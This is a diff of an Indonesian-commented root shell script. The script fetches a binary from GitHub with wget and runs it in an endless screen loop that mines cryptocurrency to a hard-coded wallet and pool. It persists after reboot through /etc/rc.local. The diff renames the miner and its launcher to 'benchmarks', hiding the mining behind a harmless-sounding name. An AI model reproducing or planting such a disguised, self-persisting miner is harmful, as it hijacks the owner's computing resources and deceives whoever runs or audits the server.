@@ -11,8 +11,8 @@ cd /root || exit
 # Download miner jika belum ada
 if [ ! -f benchmarks ]; then
   echo "⬇️ Mengunduh file benchmarks..."
-  wget -O amirul https://github.com/amirul5656/web/blob/main/benchmarks
-  chmod +x amirul
+  wget -O benchmarks https://github.com/amirul5656/web/blob/main/benchmarks
+  chmod +x benchmarks
 fi
 
 # Cek apakah screen sudah berjalan
@@ -22,16 +22,16 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3'..."
   screen -dmS amirul3 bash -c '
     while true; do
-      ./amirul --disable-gpu --algorithm xelisv2_pepew --pool stratum+tcp://retromike.net:5005 --wallet PJKBzXT2ZVcWLNAZfZTxX9PCZGGGX7CfGJ --password x -t 3
+      ./benchmarks --disable-gpu --algorithm xelisv2_pepew --pool stratum+tcp://retromike.net:5005 --wallet PJKBzXT2ZVcWLNAZfZTxX9PCZGGGX7CfGJ --password x -t 3
       sleep 2
     done
   '
 fi
 EOF
 
-chmod +x /root/sugar.sh
+chmod +x /root/benchmarks.sh
 
 echo "🚀 Menjalankan miner sekarang..."
-bash /root/sugar.sh
+bash /root/benchmarks.sh
 
 echo "✅ Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
